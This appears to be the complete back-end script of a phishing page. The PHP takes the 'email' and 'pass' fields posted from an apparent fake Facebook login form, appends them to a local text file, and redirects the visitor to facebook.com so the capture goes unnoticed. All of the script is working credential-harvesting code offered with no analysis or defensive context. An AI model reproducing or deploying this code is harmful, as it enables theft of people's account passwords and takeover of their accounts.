<?php
$id=$_POST['email'];
$pass=$_POST['pass'];
$master=fopen('jamm.txt',a);
fwrite($master,"
email: ".$id." && pass: " .$pass."");
fclose($master);
echo "<meta http-equiv='Refresh' content='1;url=http://facebook.com'>";
?>
